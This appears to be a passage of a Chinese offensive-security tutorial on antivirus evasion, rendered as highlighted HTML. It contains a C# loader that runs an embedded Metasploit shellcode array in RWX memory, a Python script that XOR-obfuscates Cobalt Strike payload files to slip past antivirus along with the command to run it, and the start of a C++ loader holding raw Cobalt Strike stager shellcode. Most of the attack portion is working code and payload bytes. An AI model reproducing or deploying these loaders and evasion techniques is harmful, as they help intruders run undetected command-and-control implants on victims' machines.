<span class="token number">0xa1</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x79</span><span class="token punctuation">,</span><span class="token number">0xf6</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x92</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0x3d</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span>
<span class="token number">0xb9</span><span class="token punctuation">,</span><span class="token number">0x63</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x8f</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">,</span><span class="token number">0x73</span><span class="token punctuation">,</span><span class="token number">0xdd</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span>
<span class="token number">0xd1</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0xc5</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0x8a</span><span class="token punctuation">,</span><span class="token number">0xd3</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0xc3</span><span class="token punctuation">,</span><span class="token number">0xf6</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0xe6</span><span class="token punctuation">,</span>
<span class="token number">0xfa</span><span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token number">0xa5</span><span class="token punctuation">,</span><span class="token number">0x95</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x47</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0xbf</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0xfd</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x62</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span>
<span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0x93</span><span class="token punctuation">,</span><span class="token number">0xa8</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0xb9</span><span class="token punctuation">,</span><span class="token number">0x37</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x47</span><span class="token punctuation">,</span><span class="token number">0x7b</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0xc1</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">,</span><span class="token number">0x7f</span><span class="token punctuation">,</span>
<span class="token number">0xa2</span><span class="token punctuation">,</span><span class="token number">0x73</span><span class="token punctuation">,</span><span class="token number">0xcd</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x2a</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x92</span><span class="token punctuation">,</span><span class="token number">0x3e</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0xeb</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span>
<span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0xcb</span><span class="token punctuation">,</span><span class="token number">0x6f</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0xc6</span><span class="token punctuation">,</span><span class="token number">0x3c</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0xda</span><span class="token punctuation">,</span><span class="token number">0xc6</span><span class="token punctuation">,</span><span class="token number">0x1c</span><span class="token punctuation">,</span><span class="token number">0x1c</span><span class="token punctuation">,</span><span class="token number">0xb6</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span>
<span class="token number">0x7b</span><span class="token punctuation">,</span><span class="token number">0xdc</span><span class="token punctuation">,</span><span class="token number">0xe2</span><span class="token punctuation">,</span><span class="token number">0x43</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xee</span><span class="token punctuation">,</span><span class="token number">0x3b</span><span class="token punctuation">,</span><span class="token number">0x93</span><span class="token punctuation">,</span><span class="token number">0xb9</span><span class="token punctuation">,</span><span class="token number">0x95</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x97</span><span class="token punctuation">,</span><span class="token number">0x8c</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span>
<span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0xee</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0xa6</span><span class="token punctuation">,</span><span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0x05</span><span class="token punctuation">,</span><span class="token number">0x99</span><span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x81</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0x5d</span><span class="token punctuation">,</span>
<span class="token number">0x37</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0x2a</span><span class="token punctuation">,</span><span class="token number">0x3d</span><span class="token punctuation">,</span><span class="token number">0xbf</span><span class="token punctuation">,</span><span class="token number">0x0e</span><span class="token punctuation">,</span><span class="token number">0xc7</span><span class="token punctuation">,</span><span class="token number">0xeb</span><span class="token punctuation">,</span><span class="token number">0x9f</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x1d</span><span class="token punctuation">,</span><span class="token number">0xb3</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0xbc</span><span class="token punctuation">,</span>
<span class="token number">0xe2</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0xb2</span><span class="token punctuation">,</span><span class="token number">0xb3</span><span class="token punctuation">,</span><span class="token number">0xa6</span><span class="token punctuation">,</span><span class="token number">0x43</span><span class="token punctuation">,</span><span class="token number">0x3e</span><span class="token punctuation">,</span><span class="token number">0x46</span><span class="token punctuation">,</span><span class="token number">0xc5</span><span class="token punctuation">,</span><span class="token number">0x0d</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x6d</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span>
<span class="token number">0xfe</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x2c</span><span class="token punctuation">,</span><span class="token number">0x4b</span><span class="token punctuation">,</span><span class="token number">0x8c</span><span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">,</span><span class="token number">0x4a</span><span class="token punctuation">,</span><span class="token number">0xbf</span><span class="token punctuation">,</span><span class="token number">0x45</span><span class="token punctuation">,</span><span class="token number">0x8c</span><span class="token punctuation">,</span><span class="token number">0xd9</span><span class="token punctuation">,</span><span class="token number">0x9e</span><span class="token punctuation">,</span>
<span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0x7f</span><span class="token punctuation">,</span><span class="token number">0xfb</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0x1e</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">,</span><span class="token number">0xe9</span><span class="token punctuation">,</span><span class="token number">0xd9</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

IntPtr handle <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">;</span>
handle <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span>
IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">,</span>
codeBytes<span class="token punctuation">.</span>Length<span class="token punctuation">,</span>
MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span>
PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>

try
<span class="token punctuation">{</span>
Marshal<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>codeBytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> handle<span class="token punctuation">,</span> codeBytes<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>
MsfpayloadProc msfpayload
<span class="token operator">=</span> Marshal<span class="token punctuation">.</span><span class="token function">GetDelegateForFunctionPointer</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token keyword">typeof</span><span class="token punctuation">(</span>MsfpayloadProc<span class="token punctuation">)</span><span class="token punctuation">)</span> as MsfpayloadProc<span class="token punctuation">;</span>
<span class="token function">msfpayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

finally
<span class="token punctuation">{</span>
<span class="token function">VirtualFree</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"Kernel32.dll"</span><span class="token punctuation">,</span> EntryPoint <span class="token operator">=</span> <span class="token string">"VirtualAlloc"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

public <span class="token keyword">static</span> <span class="token keyword">extern</span> IntPtr <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span>IntPtr address<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">,</span> ui ntallocType<span class="token punctuation">,</span> uint protect<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"Kernel32.dll"</span><span class="token punctuation">,</span> EntryPoint <span class="token operator">=</span> <span class="token string">"VirtualFree"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

public <span class="token keyword">static</span> <span class="token keyword">extern</span> bool <span class="token function">VirtualFree</span><span class="token punctuation">(</span>IntPtr address<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">,</span> uint freeType<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> uint MEM_COMMIT <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> uint MEM_RESERVE <span class="token operator">=</span> <span class="token number">0x2000</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> uint PAGE_EXECUTE_READWRITE <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> uint MEM_RELEASE <span class="token operator">=</span> <span class="token number">0x8000</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>micro8<span class="token punctuation">.</span>gitbook<span class="token punctuation">.</span>io<span class="token operator">/</span>micro8<span class="token operator">/</span>contents<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">61</span><span class="token operator">-</span><span class="token number">70</span><span class="token operator">/</span><span class="token number">66</span><span class="token operator">-</span>jie<span class="token operator">-</span>zhu<span class="token operator">-</span>aspx<span class="token operator">-</span>dui<span class="token operator">-</span>payload<span class="token operator">-</span>jin<span class="token operator">-</span>hang<span class="token operator">-</span>fen<span class="token operator">-</span>li<span class="token operator">-</span>mian<span class="token operator">-</span>sha
</code></pre>
<hr>
<h2><a id="917__533"></a>9.1.7 静态恶意代码逃逸（第一课）</h2>
<p>目前静态恶意代码最新版本第六课了…<br>
前六课的代码将会上传至Github，方便读者下载研究 :</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Rvn0xsy<span class="token operator">/</span>BadCode    <span class="token operator">--</span>感谢倾旋大佬
</code></pre>
<p><strong>0x00 前言</strong></p>
<p>在此之前，我分享过《高级后渗透C2免杀与对抗》，其中对于一些原理铺垫上稍有欠缺，因此准备分成几篇文章来展开。</p>
<p><strong>0X01 恶意代码的定义</strong></p>
<p>以下文章中的所有关于恶意代码的定义都以Cobaltstrike的载荷为例。</p>
<p><strong>0x02 Shellcode定义</strong></p>
<p>Shellcode是一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。当然你可以通过msfvenom生成各种用于测试的shellcode。</p>
<p><strong>0x03 RAW文件</strong></p>
<p>RAW 中文意思是原始的、未经加工的，通常使用Cobaltstrike生成的BIN文件。<br>
<img src="https://img-blog.csdnimg.cn/20201008164708736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
RAW文件是可以直接进行字节操作读取的，因此加载到内存较为方便，通常我一般使用混淆的方式再生成一遍。</p>
<p><strong>0x04 C文件</strong></p>
<p><img src="https://img-blog.csdnimg.cn/2020100816472273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
C文件给出的是一个C语言中的字符数组，也是可以通过以字节单位操作的。</p>
<p><strong>0x05 组合</strong></p>
<p>由于反病毒软件对于默认生成的文件查杀较为严格，我通常会采用混淆、加密解密的方式把载荷还原。</p>
<pre><code class="prism language-c">import sys
from argparse import ArgumentParser<span class="token punctuation">,</span> FileType

def <span class="token function">process_bin</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> src_fp<span class="token punctuation">,</span> dst_fp<span class="token punctuation">,</span> dst_raw<span class="token punctuation">)</span><span class="token punctuation">:</span>
    shellcode <span class="token operator">=</span> <span class="token string">''</span>
    shellcode_size <span class="token operator">=</span> <span class="token number">0</span>
    shellcode_raw <span class="token operator">=</span> b<span class="token string">''</span>
    try<span class="token punctuation">:</span>
        <span class="token keyword">while</span> True<span class="token punctuation">:</span>
            code <span class="token operator">=</span> src_fp<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> not code<span class="token punctuation">:</span>
                <span class="token keyword">break</span>

            base10 <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">^</span> num
            base10_str <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>base10<span class="token punctuation">)</span>
            shellcode_raw <span class="token operator">+</span><span class="token operator">=</span> base10_str<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            code_hex <span class="token operator">=</span> <span class="token function">hex</span><span class="token punctuation">(</span>base10<span class="token punctuation">)</span>
            code_hex <span class="token operator">=</span> code_hex<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>code_hex<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                code_hex <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">+</span> code_hex
            shellcode <span class="token operator">+</span><span class="token operator">=</span> <span class="token string">'\\x'</span> <span class="token operator">+</span> code_hex
            shellcode_size <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span>
        src_fp<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        dst_raw<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>shellcode_raw<span class="token punctuation">)</span>
        dst_raw<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        dst_fp<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
        dst_fp<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> shellcode_size
    except Exception as e<span class="token punctuation">:</span>
        sys<span class="token punctuation">.</span><span class="token constant">stderr</span><span class="token punctuation">.</span><span class="token function">writelines</span><span class="token punctuation">(</span><span class="token function">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>

def <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> <span class="token function">ArgumentParser</span><span class="token punctuation">(</span>prog<span class="token operator">=</span><span class="token string">'Shellcode X'</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">'[XOR The Cobaltstrike PAYLOAD.BINs] \t &gt; Author: rvn0xsy@gmail.com'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span><span class="token function">add_argument</span><span class="token punctuation">(</span><span class="token string">'-v'</span><span class="token punctuation">,</span><span class="token string">'--version'</span><span class="token punctuation">,</span>nargs<span class="token operator">=</span><span class="token string">'?'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span><span class="token function">add_argument</span><span class="token punctuation">(</span><span class="token string">'-s'</span><span class="token punctuation">,</span><span class="token string">'--src'</span><span class="token punctuation">,</span>help<span class="token operator">=</span>u<span class="token string">'source bin file'</span><span class="token punctuation">,</span>type<span class="token operator">=</span><span class="token function">FileType</span><span class="token punctuation">(</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> required<span class="token operator">=</span>True<span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span><span class="token function">add_argument</span><span class="token punctuation">(</span><span class="token string">'-d'</span><span class="token punctuation">,</span><span class="token string">'--dst'</span><span class="token punctuation">,</span>help<span class="token operator">=</span>u<span class="token string">'destination shellcode file'</span><span class="token punctuation">,</span>type<span class="token operator">=</span><span class="token function">FileType</span><span class="token punctuation">(</span><span class="token string">'w+'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>required<span class="token operator">=</span>True<span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span><span class="token function">add_argument</span><span class="token punctuation">(</span><span class="token string">'-n'</span><span class="token punctuation">,</span><span class="token string">'--num'</span><span class="token punctuation">,</span>help<span class="token operator">=</span>u<span class="token string">'Confused number'</span><span class="token punctuation">,</span>type<span class="token operator">=</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">default</span><span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span><span class="token function">add_argument</span><span class="token punctuation">(</span><span class="token string">'-r'</span><span class="token punctuation">,</span><span class="token string">'--raw'</span><span class="token punctuation">,</span>help<span class="token operator">=</span>u<span class="token string">'output bin file'</span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token function">FileType</span><span class="token punctuation">(</span><span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> required<span class="token operator">=</span>True<span class="token punctuation">)</span>
    args <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parse_args</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    shellcode_size <span class="token operator">=</span> <span class="token function">process_bin</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>num<span class="token punctuation">,</span> args<span class="token punctuation">.</span>src<span class="token punctuation">,</span> args<span class="token punctuation">.</span>dst<span class="token punctuation">,</span> args<span class="token punctuation">.</span>raw<span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span><span class="token constant">stdout</span><span class="token punctuation">.</span><span class="token function">writelines</span><span class="token punctuation">(</span><span class="token string">"[+]Shellcode Size : {} \n"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>shellcode_size<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>上面这个脚本是我在去年写的，用于把raw文件混淆，生成c语言数组，在后面的文章中，我们也以c/c++语言为主，探究其本质。</p>
<p><strong>混淆方案</strong></p>
<p>先生成bin文件，然后运行python脚本：</p>
<pre><code class="prism language-c">python3 <span class="token punctuation">.</span>\xor_shellcoder<span class="token punctuation">.</span>py <span class="token operator">-</span>s <span class="token punctuation">.</span>\payload<span class="token punctuation">.</span>bin  <span class="token operator">-</span>d payload<span class="token punctuation">.</span>c <span class="token operator">-</span>n <span class="token number">10</span>
</code></pre>
<p>在payload.c中会看到raw文件里的每一个字节与10的异或运算出的C语言数组。<br>
<img src="https://img-blog.csdnimg.cn/20201008164806996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
这个数组的内容，将由下一篇文章用到，实践一下Shellcode混淆免杀。</p>
<hr>
<h2><a id="918__628"></a>9.1.8 静态恶意代码逃逸（第二课）</h2>
<p><strong>0x01 关于Windows操作系统内存</strong></p>
<p>前六课的代码将会上传至Github，方便读者下载研究 :</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Rvn0xsy<span class="token operator">/</span>BadCode
</code></pre>
<p>这里还是稍微展开介绍一下，Windows操作系统的内存有三种属性，分别为：可读、可写、可执行，并且操作系统将每个进程的内存都隔离开来，当进程运行时，创建一个虚拟的内存空间，系统的内存管理器将虚拟内存空间映射到物理内存上，所以每个进程的内存都是等大的。</p>
<p>操作系统给予每个进程申请内存的权力，使用不同的API，申请的内存具有不同的涵义。</p>
<p>在进程申请时，需要声明这块内存的基本信息：申请内存大小、申请内存起始内存基址、申请内存属性、申请内存对外的权限等。</p>
<p><strong>申请方式：</strong></p>
<pre><code class="prism language-c">HeapAlloc
malloc
VirtualAlloc
new
LocalAlloc
…
</code></pre>
<p><strong>0x02 申请内存API的关系</strong></p>
<p>其实以上所有的内存申请方式都与VirtualAlloc有关，因为VirtualAlloc申请的单位是“页”。而Windows操作系统管理内存的单位也是“页”。</p>
<p><strong>0x03 实现一次正常加载</strong></p>
<p>这里我创建了一个C++项目，名字为：BadCode</p>
<p>先来使用cobaltstrike默认的shellcode进行加载，为了方便阅读参考，在代码中我会尽量留下注释。</p>
<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>


<span class="token comment">// 入口函数</span>
<span class="token keyword">int</span> <span class="token function">wmain</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span>TCHAR <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    <span class="token keyword">int</span> shellcode_size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// shellcode长度</span>
    DWORD dwThreadId<span class="token punctuation">;</span> <span class="token comment">// 线程ID</span>
    HANDLE hThread<span class="token punctuation">;</span> <span class="token comment">// 线程句柄</span>
<span class="token comment">/* length: 800 bytes */</span>

<span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x90\x1f\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x60\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x50\x45\x4f\x78\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x4e\x4c\x4e\x4c\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\